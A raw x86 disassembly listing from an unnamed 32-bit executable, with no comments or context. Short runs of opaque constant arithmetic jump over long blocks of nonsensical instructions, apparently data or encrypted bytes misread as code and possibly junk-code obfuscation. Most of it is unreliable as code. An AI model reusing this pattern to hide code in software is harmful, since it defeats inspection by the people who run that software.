  40cb10:	add    eax,0xebb56f2f
  40cb15:	cmp    BYTE PTR [edi],dl
  40cb17:	in     al,0xf
  40cb19:	loop   0x40cb64
  40cb1b:	add    eax,0x83249d71
  40cb20:	call   0x6e50d0fe
  40cb25:	push   eax
  40cb26:	(bad)  
  40cb27:	mov    al,ds:0x56cdf45c
  40cb2c:	das    
  40cb2d:	mov    edx,0x898399db
  40cb32:	mov    bh,BYTE PTR [ebx-0x53]
  40cb35:	or     ebx,DWORD PTR [edi+eax*4+0x5e42c80b]
  40cb3c:	cli    
  40cb3d:	inc    edi
  40cb3e:	push   edx
  40cb3f:	js     0x40cb72
  40cb41:	mov    ch,0x1
  40cb43:	call   0x6908:0xdb0f8cba
  40cb4a:	jbe    0x40cb07
  40cb4c:	and    edx,ecx
  40cb4e:	aaa    
  40cb4f:	jne    0x40caf1
  40cb51:	(bad)  
  40cb52:	out    0xe6,eax
  40cb54:	xchg   ch,cl
  40cb56:	hlt    
  40cb57:	fistp  DWORD PTR [edi]
  40cb59:	pop    es
  40cb5a:	ins    DWORD PTR es:[edi],dx
  40cb5b:	or     DWORD PTR [esi],edi
  40cb5d:	clc    
  40cb5e:	cwde   
  40cb5f:	popa   
  40cb60:	mov    bl,ah
  40cb62:	int    0xfb
  40cb64:	mov    eax,0x4e97d1e0
  40cb69:	xor    al,0x3d
  40cb6b:	xor    BYTE PTR [esi+0x17d60789],dh
  40cb71:	push   ebx
  40cb72:	js     0x40cbb7
  40cb74:	mov    ebx,ebp
  40cb76:	fld    TBYTE PTR [ecx+0x57b5d15c]
  40cb7c:	dec    ebx
  40cb7d:	inc    ebp
  40cb7e:	add    al,BYTE PTR [edx+ecx*8]
  40cb81:	mov    edi,0xea92dc37
  40cb86:	fiadd  WORD PTR [esi-0x6796754a]
  40cb8c:	std    
  40cb8d:	pop    eax
  40cb8e:	imul   ebx,edx,0x71
  40cb91:	push   0x40
  40cb93:	es imul eax,ecx,0x2cce82ab
  40cb9a:	sbb    eax,0xb0a68519
  40cb9f:	push   ecx
  40cba0:	jmp    0x3947:0x22eaf0f7
  40cba7:	push   ebp
  40cba8:	xor    dl,BYTE PTR ds:0x8a6fc443
  40cbae:	dec    edi
  40cbaf:	(bad)  
  40cbb0:	push   esi
  40cbb1:	mov    bl,0x41
  40cbb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbb4:	inc    ecx
  40cbb5:	lds    esp,FWORD PTR [ebx]
  40cbb7:	test   esi,ebx
  40cbb9:	xchg   esi,eax
  40cbba:	outs   dx,BYTE PTR ds:[esi]
  40cbbb:	mov    al,0xf4
  40cbbd:	mov    eax,ds:0xbf11af48
  40cbc2:	mov    ch,0xb7
  40cbc4:	loope  0x40cb89
  40cbc6:	mov    dl,0x5b
  40cbc8:	dec    BYTE PTR [ebp-0x48]
  40cbcb:	jle    0x40cbc7
  40cbcd:	pop    ebp
  40cbce:	or     edx,edi
  40cbd0:	scas   al,BYTE PTR es:[edi]
  40cbd1:	push   ecx
  40cbd2:	stc    
  40cbd3:	dec    ecx
  40cbd4:	cmp    eax,0x829f6450
  40cbd9:	je     0x40cc05
  40cbdb:	ja     0x40cbfc
  40cbdd:	ss jl  0x40cbef
  40cbe0:	and    DWORD PTR [ecx],0x0
  40cbe3:	add    BYTE PTR [eax],al
  40cbe5:	mov    eax,DWORD PTR [ebp-0x18]
  40cbe8:	mov    edx,DWORD PTR [ebp-0x14]
  40cbeb:	shrd   eax,edx,0x2
  40cbef:	xor    eax,ecx
  40cbf1:	mov    ecx,DWORD PTR [ebp-0x18]
  40cbf4:	shr    edx,0x2
  40cbf7:	mov    edx,DWORD PTR [ebp-0x14]
  40cbfa:	xor    edx,edx
  40cbfc:	shl    ecx,0x1e
  40cbff:	or     eax,edx
  40cc01:	mov    ds:0x422650,eax
  40cc06:	pop    esi
  40cc07:	leave  
  40cc08:	ret    
  40cc09:	push   ebp
  40cc0a:	mov    ebp,esp
  40cc0c:	sub    esp,0x28
  40cc0f:	push   ebx
  40cc10:	push   esi
  40cc11:	push   edi
  40cc12:	mov    DWORD PTR [ebp-0x10],0x67e2
  40cc19:	mov    DWORD PTR [ebp-0x4],0x4726
  40cc20:	mov    DWORD PTR [ebp-0x8],0x580
  40cc27:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40cc2e:	mov    DWORD PTR [ebp-0x28],0x3294
  40cc35:	mov    DWORD PTR [ebp-0x24],0x643
  40cc3c:	mov    DWORD PTR [ebp-0x20],0x2545
  40cc43:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40cc4a:	xor    ebx,ebx
  40cc4c:	inc    ebx
  40cc4d:	mov    DWORD PTR [ebp-0x18],ebx
  40cc50:	mov    DWORD PTR [ebp-0x14],0x76b1
  40cc57:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc5a:	jmp    0x40cf1e
  40cc5f:	sub    edi,ebx
  40cc61:	sti    
  40cc62:	xchg   edi,eax
  40cc63:	sbb    dl,BYTE PTR [edi+0x7d189a1a]
  40cc69:	xor    DWORD PTR [eax+0x70cb5ef6],0x1818edb9
  40cc73:	rcl    BYTE PTR [eax+ebx*1],cl
  40cc76:	sbb    BYTE PTR [esi+0x44],al
  40cc79:	out    0x30,al
  40cc7b:	mov    ecx,0x2fce0312
  40cc80:	test   al,0x18
  40cc82:	inc    esp
  40cc83:	sbb    ah,BYTE PTR [ecx+ebx*1-0x72]
  40cc87:	add    DWORD PTR [esp+edx*2-0x144023d4],eax
  40cc8e:	nop
  40cc8f:	out    dx,al
  40cc90:	sbb    DWORD PTR [eax],0xb6d114d6
  40cc96:	adc    ch,BYTE PTR [edi-0x57]
  40cc99:	jecxz  0x40cc72
  40cc9b:	shl    cl,cl
  40cc9d:	inc    edx
  40cc9e:	aad    0x15
  40cca0:	sbb    esi,edi
  40cca2:	sbb    ch,bl
  40cca4:	or     BYTE PTR [edx-0x1097971],ah
  40ccaa:	add    ecx,DWORD PTR [ebp-0x68]
  40ccad:	sbb    al,0xe0
  40ccaf:	sub    BYTE PTR [edx],cl
  40ccb1:	add    eax,DWORD PTR [bx+di+0x3207]
  40ccb6:	or     eax,0x5345c52d
  40ccbb:	(bad)  
  40ccbd:	ss out 0xd8,eax
  40ccc0:	mov    esp,DWORD PTR [ebx+0x6df203b8]
  40ccc6:	shr    DWORD PTR [ecx+0x78edb32d],cl
  40cccc:	cmp    DWORD PTR [esi+0x29],esp
  40cccf:	inc    ebp
  40ccd0:	loop   0x40cccf
  40ccd2:	call   0x273ba806
  40ccd7:	ds xchg edx,eax
  40ccd9:	jge    0x40ccd0
  40ccdb:	or     eax,0xaddbd0c0
  40cce0:	cmp    bl,bl
  40cce2:	loope  0x40ccab
  40cce4:	dec    edx
  40cce5:	sub    eax,0x7a727ed3
  40ccea:	(bad)  
  40cceb:	in     al,dx
  40ccec:	lea    edi,[edi+0x474939c8]
  40ccf2:	lods   al,BYTE PTR ds:[esi]
  40ccf3:	mov    DWORD PTR [ecx],ebx
  40ccf5:	jne    0x40ccba
  40ccf7:	sbb    BYTE PTR [edi],cl
  40ccf9:	push   cs
  40ccfa:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40ccfc:	loop   0x40ccf5
  40ccfe:	inc    ebp
  40ccff:	lock mov ah,BYTE PTR [eax-0x1a]
  40cd03:	adc    eax,0x4346f6a2
  40cd08:	sbb    ch,BYTE PTR [ebx+edi*2]
  40cd0b:	push   ds
  40cd0c:	sub    dl,BYTE PTR [ebp-0x69]
  40cd0f:	popf   
  40cd10:	xlat   BYTE PTR ds:[ebx]
  40cd11:	lods   eax,DWORD PTR ds:[esi]
  40cd12:	sub    al,0xb7
  40cd14:	retf   
  40cd15:	rcr    eax,cl
  40cd17:	fmul   DWORD PTR [edx-0x7a]
  40cd1a:	xchg   ecx,eax
  40cd1b:	scas   al,BYTE PTR es:[edi]
  40cd1c:	add    edx,DWORD PTR [esi-0x7c169f15]
  40cd22:	push   esp
  40cd23:	pop    ebx
  40cd24:	enter  0xcfe6,0x96
  40cd28:	xor    eax,0x1038b002
  40cd2d:	inc    edx
  40cd2e:	pop    ss
  40cd2f:	jecxz  0x40cd12
  40cd31:	dec    ecx
  40cd32:	or     BYTE PTR [ecx+0x485ce456],bh
  40cd38:	(bad)  
  40cd39:	sbb    al,0x32
  40cd3b:	jnp    0x40ccd5
  40cd3d:	lea    edi,[edx]
  40cd3f:	add    ecx,DWORD PTR [edx+0x4c]
  40cd42:	rcr    DWORD PTR [ebx+0x5f],0x98
  40cd46:	popa   
  40cd47:	aas    
  40cd48:	inc    edx
  40cd49:	clc    
  40cd4a:	jg     0x40cccd
  40cd4c:	xor    edi,ecx
  40cd4e:	mov    al,ds:0x59ea42e0
  40cd53:	push   esp
  40cd54:	pushf  
  40cd55:	jmp    0xead6a4fc
  40cd5a:	fadd   DWORD PTR [ecx]
  40cd5c:	xchg   edi,eax
  40cd5d:	jl     0x40cd26
  40cd5f:	mov    ecx,0xaa998073
  40cd64:	sbb    DWORD PTR [ebp-0xaab3ed6],ebp
  40cd6a:	fist   WORD PTR [esi+eiz*1]
  40cd6d:	and    DWORD PTR [esi+0x5b],ebp
  40cd70:	sahf   
  40cd71:	cmp    al,0x97
  40cd73:	shr    DWORD PTR [ecx+esi*4],cl
  40cd76:	das    
  40cd77:	xchg   ebp,eax
  40cd78:	dec    esi
  40cd79:	mov    cl,0x22
  40cd7b:	neg    ch
  40cd7d:	cmp    DWORD PTR [eax+0x3d65accd],0x56
  40cd84:	out    0xdb,al
  40cd86:	dec    esp
  40cd87:	mov    ds:0x6a560ec2,eax
  40cd8c:	mul    ah
  40cd8e:	jnp    0x40cddd
  40cd90:	je     0x40cd5c
  40cd92:	push   ss
  40cd93:	gs hlt 
  40cd95:	mov    dl,0xab
  40cd97:	inc    ebx
  40cd98:	ds popf 
  40cd9a:	push   ds
  40cd9b:	aam    0x8c
  40cd9d:	bound  eax,QWORD PTR [ebx-0x3d]
  40cda0:	pop    ebx
  40cda1:	ret    0xab30
  40cda4:	pop    edi
  40cda5:	jmp    0x1b0d:0xc9b03aa7
  40cdac:	mov    eax,0x9d3a0
  40cdb1:	out    0x7,al
  40cdb3:	shl    DWORD PTR [edi-0xd78b945],1
  40cdb9:	clc    
  40cdba:	rcr    DWORD PTR [ebp-0x4e],1
  40cdbd:	add    DWORD PTR [ecx],0x48d31401
  40cdc3:	pop    DWORD PTR ds:0x590a5d77
  40cdc9:	push   edx
  40cdca:	dec    edi
  40cdcb:	lds    ebx,FWORD PTR [ebx]
  40cdcd:	pop    esi
  40cdce:	xor    al,BYTE PTR [ebx-0x1f]
  40cdd1:	mov    al,0xde
  40cdd3:	stc    
  40cdd4:	jmp    0x2a12:0x193132c
  40cddb:	in     eax,dx
  40cddc:	loopne 0x40cd95
  40cdde:	cmp    ch,BYTE PTR [eax+0x59724e5]
  40cde4:	dec    edx
  40cde5:	sub    dh,BYTE PTR [edx-0x59]
  40cde8:	lea    eax,[ecx+0x6b15c7a4]
  40cdee:	popa   
  40cdef:	or     ah,bl
  40cdf1:	mov    DWORD PTR [eax+eax*8],ebp
  40cdf4:	mov    BYTE PTR [ebx],ch
  40cdf6:	retf   0xcdac
  40cdf9:	fcmovb st,st(4)
  40cdfb:	test   al,0x50
  40cdfd:	test   al,0xc0
  40cdff:	ror    DWORD PTR [ecx+0x28bff5eb],cl
  40ce05:	std    
  40ce06:	arpl   WORD PTR [edi-0x2914e510],dx
  40ce0c:	mov    al,BYTE PTR [edx-0x6]
  40ce0f:	fadd   DWORD PTR [eax]
  40ce11:	push   ebx
  40ce12:	sti    
  40ce13:	mov    dl,0xb6
  40ce15:	fs pushf 
  40ce17:	mov    ds:0x5b81f8b8,eax
  40ce1c:	fmul   DWORD PTR [edx]
  40ce1e:	cs pop edx
  40ce20:	ins    BYTE PTR es:[edi],dx
  40ce21:	dec    esi
  40ce22:	icebp  
  40ce23:	or     ebx,eax
  40ce25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce26:	outs   dx,DWORD PTR ds:[esi]
  40ce27:	dec    esp
  40ce28:	pusha  
  40ce29:	das    
  40ce2a:	push   cs
  40ce2b:	in     eax,0x38
  40ce2d:	in     al,0x2c
  40ce2f:	push   esp
  40ce30:	stos   BYTE PTR es:[edi],al
  40ce31:	scas   al,BYTE PTR es:[edi]
  40ce32:	mov    ebx,0x789401c2
  40ce37:	into   
  40ce38:	aam    0x85
  40ce3a:	daa    
  40ce3b:	(bad)
  40ce3f:	popa   
  40ce40:	out    dx,eax
  40ce41:	mov    eax,ds:0x8606830f
  40ce46:	fidivr WORD PTR [esi]
  40ce48:	pop    ebx
  40ce49:	push   ss
  40ce4a:	call   FWORD PTR [eax-0xa]
  40ce4d:	bound  edi,QWORD PTR [ebx-0x247dcf76]
  40ce53:	out    0xa9,al
  40ce55:	and    dl,ch
  40ce57:	xchg   DWORD PTR [ecx+0x4c84d3a8],esp
  40ce5d:	ror    BYTE PTR [edi],0x8e
  40ce60:	add    bh,BYTE PTR ds:0x7da5bee0
  40ce66:	mov    esi,0xb5d1bdec
  40ce6b:	scas   eax,DWORD PTR es:[edi]
  40ce6c:	push   esp
  40ce6d:	dec    esi
  40ce6e:	cs jo  0x40cdf2
  40ce71:	jecxz  0x40cee5
  40ce73:	sar    esi,0x43
  40ce76:	dec    esp
  40ce77:	mov    eax,0x6ee6fb45
  40ce7c:	inc    ebx
  40ce7d:	dec    ebp
  40ce7e:	adc    DWORD PTR [edi],ebx
  40ce80:	gs push cs
  40ce82:	dec    ebx
  40ce83:	mov    ebp,0x741d111c
  40ce88:	mov    ebx,0xa9f08d40
  40ce8d:	jmp    DWORD PTR [edx+0x1a]
  40ce90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce91:	addr16 push 0xbb54ce65
  40ce97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce98:	mov    bl,0xa3
  40ce9a:	test   eax,0x458acd3
  40ce9f:	std    
  40cea0:	fldcw  WORD PTR [ebx]
  40cea2:	icebp  
  40cea3:	fist   WORD PTR [ebx+edi*4-0x21]
  40cea7:	pop    edi
  40cea8:	lds    ecx,FWORD PTR [ebp-0x26]
  40ceab:	cmp    ebp,edx
  40cead:	sub    DWORD PTR [ebx],esp
  40ceaf:	scas   al,BYTE PTR es:[edi]
  40ceb0:	and    DWORD PTR [ecx-0x38f3aa8f],ecx
  40ceb6:	jns    0x40cee6
  40ceb8:	sti    
  40ceb9:	(bad)  
  40cebb:	scas   eax,DWORD PTR es:[edi]
  40cebc:	adc    eax,0x46160215
  40cec1:	call   0xef3f:0xa72ff54e
  40cec8:	neg    DWORD PTR [ebp-0x7df7aa37]
  40cece:	into   
  40cecf:	leave  
  40ced0:	jg     0x40ceb7
  40ced2:	mov    ds:0xee239908,eax
  40ced7:	or     eax,0xa1051693
  40cedc:	daa    
  40cedd:	test   BYTE PTR [ecx],0xb
  40cee0:	in     eax,0xa8
  40cee2:	pop    ebp
  40cee3:	or     BYTE PTR [edi],0x6b
  40cee6:	mov    DWORD PTR [ebp+0x4c78fee5],ebx
  40ceec:	lds    eax,FWORD PTR [esi-0x9b83c76]
  40cef2:	and    edx,DWORD PTR [ebx-0x77b3815b]
  40cef8:	pop    esi
  40cef9:	add    esp,DWORD PTR ds:0xb5971248
  40ceff:	mov    eax,0xc5f80e2
  40cf04:	and    esi,DWORD PTR [edx]
  40cf06:	shl    DWORD PTR [edi-0x15],cl
  40cf09:	arpl   WORD PTR [edi+0x598c48e5],bx
  40cf0f:	retf   0x642c
  40cf12:	(bad)  
  40cf13:	(bad)  
  40cf14:	jae    0x40cf3a
  40cf16:	mov    DWORD PTR [eax],edi
  40cf18:	std    
  40cf19:	push   cs
  40cf1a:	cmp    esi,DWORD PTR [ebp+0x24]
  40cf1d:	repz mov eax,DWORD PTR [ebp-0x4]
  40cf21:	sub    ecx,eax
  40cf23:	add    ecx,DWORD PTR [ebp-0xc]
  40cf26:	add    ecx,DWORD PTR [ebp-0x10]
  40cf29:	imul   ecx,ecx,0x1f80
  40cf2f:	add    ecx,0x727e
  40cf35:	xor    ecx,0x106c92f2
  40cf3b:	mov    DWORD PTR [ebp-0x8],0x113c
  40cf42:	mov    DWORD PTR [ebp-0xc],0x3d61
  40cf49:	mov    DWORD PTR [ebp-0x10],0x16e9
  40cf50:	mov    DWORD PTR [ebp-0x4],0x21aa
  40cf57:	mov    eax,DWORD PTR [ebp-0x10]
  40cf5a:	or     eax,0x3611
  40cf5f:	add    eax,DWORD PTR [ebp-0xc]
  40cf62:	mov    edx,DWORD PTR [ebp-0x8]
  40cf65:	and    eax,edx
  40cf67:	mov    edx,ecx
  40cf69:	sub    edx,eax
  40cf6b:	mov    eax,DWORD PTR [ebp-0x4]
  40cf6e:	mov    esi,DWORD PTR ds:0x422548
  40cf74:	mov    esi,DWORD PTR [esi+0x1cc]
  40cf7a:	add    eax,0x6772
  40cf7f:	or     eax,0x1f24
  40cf84:	sub    eax,0x7046
  40cf89:	xor    eax,0x497a
  40cf8e:	sub    esi,eax
  40cf90:	mov    eax,DWORD PTR [ebp+0x8]
  40cf93:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40cf9a:	jmp    0x40d25e
  40cf9f:	nop
  40cfa0:	xchg   ebx,eax
  40cfa1:	retf   
  40cfa2:	ja     0x40cf6e
  40cfa4:	das    
  40cfa5:	sub    al,0x6a
  40cfa7:	sbb    DWORD PTR [esi-0x7327432d],esi
  40cfad:	cdq    
  40cfae:	mov    esp,0x1818e872
  40cfb3:	rcl    BYTE PTR [eax+ebx*1],cl
  40cfb6:	sbb    cl,al
  40cfb8:	adc    DWORD PTR [esi],ecx
  40cfba:	fbstp  TBYTE PTR [edx]
  40cfbc:	add    ebp,ebx
  40cfbe:	jb     0x40cf65
  40cfc0:	test   dh,dl
  40cfc2:	call   0x30d0dc70
  40cfc7:	push   edi
  40cfc8:	std    
  40cfc9:	repz sbb BYTE PTR [ebx-0x5430b1fa],ch
  40cfd0:	jmp    0x5ded:0xe79512
  40cfd7:	cdq    
  40cfd8:	push   0x26d409bb
  40cfdd:	and    edx,DWORD PTR [ebx-0x1f]
  40cfe0:	sub    eax,0x39ed6bb6
  40cfe5:	xchg   ebp,eax
  40cfe6:	sbb    bh,cl
  40cfe8:	lahf   
  40cfe9:	clc    
  40cfea:	xchg   esi,eax
  40cfeb:	mov    ds:0x5c3daebc,eax
  40cff0:	ins    BYTE PTR es:[edi],dx
  40cff1:	ins    DWORD PTR es:[edi],dx
  40cff2:	hlt    
  40cff3:	push   edx
  40cff5:	cmp    eax,0x97aa309e
  40cffa:	lods   al,BYTE PTR ds:[esi]
  40cffb:	(bad)  
  40cffd:	test   BYTE PTR [esi],0x67
  40d000:	adc    bh,ah
  40d002:	jnp    0x40cf91
  40d004:	xchg   BYTE PTR [edx],bh
  40d006:	mov    ch,0x2d
  40d008:	in     eax,dx
  40d009:	jno    0x40d066
  40d00b:	push   es
  40d00c:	ja     0x40d073
  40d00e:	es int3 
  40d010:	push   ss
  40d011:	test   al,0x2a
  40d013:	add    edx,edi
  40d015:	jl     0x40cfa2
  40d017:	jecxz  0x40d07a
  40d019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d01a:	jmp    0xa83db8a
  40d01f:	(bad)  
  40d020:	(bad)  
  40d021:	mov    ch,0x19
  40d024:	inc    esi
  40d025:	xor    al,0x70
  40d027:	push   0x279ff2c3
  40d02c:	das    
  40d02d:	mov    ebx,0xa00a3090
  40d032:	into   
  40d033:	inc    ecx
  40d034:	lods   eax,DWORD PTR ds:[esi]
  40d035:	jns    0x40d08c
  40d037:	hlt    
  40d038:	div    BYTE PTR [edx+0x5d25a095]
  40d03e:	dec    ebp
  40d03f:	jne    0x40cfd9
  40d041:	fwait
  40d042:	push   esi
  40d043:	push   es
  40d044:	(bad)  
  40d045:	fsub   QWORD PTR [ebx-0x52]
  40d048:	mov    ds:0x3188ecfc,eax
  40d04d:	ret    
  40d04e:	stos   BYTE PTR es:[edi],al
  40d04f:	cmp    BYTE PTR [ecx],0x99
  40d052:	push   ebp
  40d053:	test   bh,ch
  40d055:	and    al,0xea
  40d057:	sbb    DWORD PTR [eax+0x7fbafa88],ebx
  40d05d:	inc    ebx
  40d05e:	push   edi
  40d05f:	xlat   BYTE PTR ds:[ebx]
  40d060:	xor    dh,BYTE PTR [edx+0x36]
  40d063:	pop    esp
  40d064:	fild   DWORD PTR [edx-0x4741cc0c]
  40d06a:	lds    eax,FWORD PTR [edi]
  40d06c:	enter  0x3594,0x56
  40d070:	imul   edx,DWORD PTR [edx-0x72],0xfffffff8
  40d074:	lahf   
  40d075:	dec    esp
  40d076:	push   0xe12489f1
  40d07b:	push   ecx
  40d07c:	inc    ecx
  40d07d:	sbb    ah,BYTE PTR [ebp+0x558ae9b6]
  40d083:	adc    eax,0x4126cffd
  40d088:	enter  0x696c,0x18
  40d08c:	(bad)  
  40d08d:	int    0x6e
  40d08f:	jmp    FWORD PTR [esi+esi*1]
  40d092:	sub    ebx,DWORD PTR [ecx+0x285f96f4]
  40d098:	push   edx
  40d099:	and    al,0x65
  40d09b:	and    al,0x8a
  40d09d:	jmp    0x81ea:0xec59dcf9
  40d0a4:	(bad)  
  40d0a5:	rol    ch,0x8f
  40d0a8:	push   ecx
  40d0a9:	mov    ah,0x6
  40d0ab:	push   esi
  40d0ac:	retf   
  40d0ad:	imul   eax,DWORD PTR [edi-0x4fcd5a13]
  40d0b4:	lods   eax,DWORD PTR ds:[esi]
  40d0b5:	xchg   edi,eax
  40d0b6:	test   BYTE PTR [eax+ebx*1],cl
  40d0b9:	iret   
  40d0ba:	mov    bl,0x15
  40d0bc:	test   BYTE PTR [ecx+0x32],0xfe
  40d0c0:	mov    edi,0x3100c99d
  40d0c5:	retf   0x1455
  40d0c8:	rol    DWORD PTR [edx+0x46],0xc6
  40d0cc:	sub    DWORD PTR [ebx+ecx*4-0x3ba5aa7f],ecx
  40d0d3:	enter  0xe538,0x1e
  40d0d7:	and    DWORD PTR [ecx],0xffffff84
  40d0da:	xor    ebx,DWORD PTR ds:0x222eb18a
  40d0e0:	mov    esi,0x8a027455
  40d0e5:	repz add BYTE PTR [edx-0x3a],bl
  40d0e9:	pop    ebp
  40d0ea:	mov    ch,0x4
  40d0ec:	popa   
  40d0ed:	xor    DWORD PTR [esi-0x3c],eax
  40d0f0:	je     0x40d130
  40d0f2:	adc    DWORD PTR [ecx-0x145f7bf2],esi
  40d0f8:	pop    ds
  40d0f9:	leave  
  40d0fa:	nop
  40d0fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0fc:	mov    cl,dh
  40d0fe:	push   0x1d567529
  40d103:	add    BYTE PTR [edx-0x2a],al
  40d106:	lds    eax,FWORD PTR [edx+0x68c1a8b4]
  40d10c:	pop    ecx
  40d10d:	or     eax,0x1da80658
  40d112:	cmp    DWORD PTR cs:[esi],ebx
  40d115:	or     DWORD PTR [edi-0x7a8ee1e2],ebx
  40d11b:	mov    al,ds:0x6cf9b578
  40d120:	sub    ebp,edx
  40d122:	mov    esp,0x4af3d790
  40d127:	xor    BYTE PTR [edx-0x7450fc7c],dh
  40d12d:	inc    esi
  40d12e:	pop    edx
  40d12f:	push   ecx
  40d130:	adc    BYTE PTR [edx+edi*2],al
  40d133:	in     al,dx
  40d134:	in     al,0x5f
  40d136:	pop    ss
  40d137:	mov    bh,BYTE PTR [eax+0x3b]
  40d13a:	adc    al,0xb2
  40d13c:	sub    eax,0x8ea1baf3
  40d141:	bound  esi,QWORD PTR [ecx+ebp*1-0x6e]
  40d145:	cmp    al,0x53
  40d147:	cmc    
  40d148:	fsub   st(7),st
  40d14a:	in     al,0x10
  40d14c:	popa   
  40d14d:	xchg   ecx,eax
  40d14e:	push   edi
  40d14f:	xlat   BYTE PTR ds:[ebx]
  40d150:	mov    ds,WORD PTR [edx-0x590efd64]
  40d156:	jge    0x40d177
  40d158:	lods   al,BYTE PTR ds:[esi]
  40d159:	sbb    ebp,DWORD PTR [edx+0x61]
  40d15c:	push   0x4082b55a
  40d161:	iret   
  40d162:	jle    0x40d12b
  40d164:	(bad)  
  40d165:	mov    dh,0xe9
  40d167:	and    ebp,ebp
  40d169:	(bad)  
  40d16a:	stos   DWORD PTR es:[edi],eax
  40d16b:	ss xchg ebp,edi
  40d16e:	push   esi
  40d16f:	pop    ecx
  40d170:	loopne 0x40d1e3
  40d172:	ins    DWORD PTR es:[edi],dx
  40d173:	mov    al,0xb4
  40d175:	(bad)  
  40d177:	xor    al,0x79
  40d179:	mov    ecx,0xe2eb4d24
  40d17e:	add    BYTE PTR [ebx],dh
  40d180:	jno    0x40d17d
  40d182:	(bad)  
  40d183:	sbb    eax,0xdef702b6
  40d188:	dec    edi
  40d189:	xchg   edi,eax
  40d18a:	inc    ebp
  40d18b:	cmp    DWORD PTR [edx+0x6c],ebp
  40d18e:	into   
  40d18f:	or     eax,0xdecba5be
  40d194:	fdiv   DWORD PTR [ebx-0x6b]
  40d197:	xchg   esi,eax
  40d198:	sahf   
  40d199:	inc    edx
  40d19a:	cmc    
  40d19b:	mov    edx,es
  40d19d:	stos   BYTE PTR es:[edi],al
  40d19e:	test   DWORD PTR [ebx+0x26],esp
  40d1a1:	scas   eax,DWORD PTR es:[edi]
  40d1a2:	adc    al,BYTE PTR [esi]
  40d1a4:	(bad)  
  40d1a5:	aas    
  40d1a6:	or     DWORD PTR [ebp+ecx*2+0xde69e40],ebx
  40d1ad:	sahf   
  40d1ae:	mov    edi,0x2db02791
  40d1b3:	dec    ebx
  40d1b4:	je     0x40d1c2
  40d1b6:	test   BYTE PTR [ecx+0x255120fd],0xe1
  40d1bd:	and    eax,0xf65135b
  40d1c2:	push   0x15c03ee5
  40d1c7:	in     eax,0x21
  40d1c9:	repnz push ebp
  40d1cb:	aad    0x11
  40d1cd:	mov    edi,0x23db7730
  40d1d2:	adc    DWORD PTR [ebx-0x10095a5b],edi
  40d1d8:	adc    BYTE PTR cs:[esi],al
  40d1db:	nop
  40d1dc:	sahf   
  40d1dd:	mov    eax,0x83a68b62
  40d1e2:	jo     0x40d1cf
  40d1e4:	sbb    eax,0xdbea0a83
  40d1e9:	dec    eax
  40d1ea:	mov    bh,0x17
  40d1ec:	inc    ebp
  40d1ed:	outs   dx,DWORD PTR ds:[esi]
  40d1ee:	mov    edx,0xfe4ce96f
  40d1f3:	mov    ch,0xdc
  40d1f5:	fwait
  40d1f6:	(bad)  
  40d1f7:	repnz sub al,0x1f
  40d1fa:	lahf   
  40d1fb:	in     eax,0x4b
  40d1fd:	push   cs
  40d1fe:	in     al,dx
  40d1ff:	mov    BYTE PTR [edx+0x19],dh
  40d202:	dec    ecx
  40d203:	outs   dx,DWORD PTR ds:[esi]
  40d204:	cmp    eax,0x23006fb6
  40d209:	outs   dx,DWORD PTR ds:[esi]
  40d20a:	add    BYTE PTR [ebx],ch
  40d20c:	add    DWORD PTR [edx],ecx
  40d20e:	jecxz  0x40d281
  40d210:	out    dx,al
  40d211:	dec    edi
  40d212:	mov    cl,0xf6
  40d214:	mov    ds:0xe9eea52e,al
  40d219:	pop    edi
  40d21a:	sahf   
  40d21b:	sub    cl,ah
  40d21d:	jecxz  0x40d21a
  40d21f:	jns    0x40d27d
  40d221:	aam    0xc8
  40d223:	mov    ebp,0x20d1f8a8
  40d228:	iret   
  40d229:	or     DWORD PTR [esi+0x44],ebp
  40d22c:	cmp    al,0x90
  40d22e:	in     al,0x43
  40d230:	loope  0x40d249
  40d232:	mov    esi,DWORD PTR [esi-0x20]
  40d235:	repz push ebx
  40d237:	pop    edi
  40d238:	mov    BYTE PTR [eax-0x59c5db85],ch
  40d23e:	mov    al,ds:0x8f04b2a9
  40d243:	adc    BYTE PTR [edx],cl
  40d245:	sub    BYTE PTR [edx+0x7a],cl
  40d248:	cmp    al,0xc4
  40d24a:	ds dec ecx
  40d24c:	repnz mov cl,0xe
  40d24f:	add    edx,ebx
  40d251:	lods   eax,DWORD PTR ds:[esi]
  40d252:	out    0xcc,al
  40d254:	cmp    ecx,DWORD PTR [eax+edi*4-0x3c]
  40d258:	fcomp  QWORD PTR [ecx+0x0]
  40d25b:	xchg   ch,ch
  40d25d:	or     BYTE PTR [eax+0x458b0e04],0xec
  40d264:	mov    esi,DWORD PTR [ebp-0x18]
  40d267:	and    eax,0x2389
  40d26c:	xor    eax,0x695
  40d271:	xor    edx,edx
  40d273:	div    esi
  40d275:	lea    ecx,[ecx+eax*1-0x2413]
  40d27c:	mov    eax,DWORD PTR [ebp-0x1c]
  40d27f:	add    eax,DWORD PTR [ebp-0x20]
  40d282:	mov    edx,DWORD PTR [ebp-0x24]
  40d285:	and    eax,edx
  40d287:	mov    edx,DWORD PTR [ebp-0x28]
  40d28a:	imul   eax,edx
  40d28d:	mov    edx,0xd0c8f
  40d292:	sub    edx,eax
  40d294:	cmp    ecx,edx
  40d296:	jbe    0x40cf3b
  40d29c:	push   0x2
  40d29e:	pop    eax
  40d29f:	mov    DWORD PTR [ebp-0x1c],eax
  40d2a2:	mov    DWORD PTR [ebp-0x20],ebx
  40d2a5:	mov    DWORD PTR [ebp-0x24],0x5
  40d2ac:	mov    DWORD PTR [ebp-0x28],0x6686
  40d2b3:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40d2ba:	mov    DWORD PTR [ebp-0x4],eax
  40d2bd:	mov    DWORD PTR [ebp+0x8],0x739a
  40d2c4:	mov    DWORD PTR [ebp-0xc],0xf3a
  40d2cb:	xor    edx,edx
  40d2cd:	mov    DWORD PTR [ebp-0x10],0x429
  40d2d4:	mov    eax,DWORD PTR [ebp-0x28]
